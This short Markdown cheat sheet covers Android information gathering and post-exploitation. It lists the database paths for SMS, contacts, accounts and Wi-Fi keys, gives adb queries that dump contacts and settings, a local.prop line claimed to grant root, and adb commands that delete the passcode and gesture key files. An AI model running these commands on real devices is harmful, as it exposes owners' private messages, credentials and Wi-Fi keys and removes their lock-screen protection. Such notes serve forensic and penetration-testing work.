# Android

##Information Gathering

###Text Messages (Needs Root):

```
/data/data/com.android.providers.telephony/databases/mmssms.db
/data/data/com.android.providers/telephony/databases/mmssms.db
```

###Grab Contacts and Settings (does not need root):

```
adb shell content query --uri content://contacts/phones
adb shell content query --uri content://settings/secure
adb shell content query --uri content://settings/global
```

###Contacts (Needs Root):

```
/data/data/com.android.providers.contacts/databases/contacts2.db
/data/data/com.android.providers.contacts/databases/contacts.db
/data/data/android.providers.contacts/databases
```

###Accounts (Needs Root):

```
/data/system/users/0/accounts.db
/data/system/accounts.db
```

###Wifi Keys (Needs Root):

```
/data/misc/wifi/wpa_supplicant.conf
```

###Local System Settings:

```
/data/local.prop
```

###Device Settings:

```
/system/build.prop
```

##Misc.

If you can write to this file the following line will grant root:

```
echo "ro.kernel.qemu=1" > /data/local.prop
```

Start an application via adb shell:

```
am start -a android.intent.activity.MAIN -n com.application.identifier/.ActivityID
```

Remove passcode lock (Need Root):

```
adb shell rm /data/system/gesture.key
adb shell rm /data/system/password.key
```
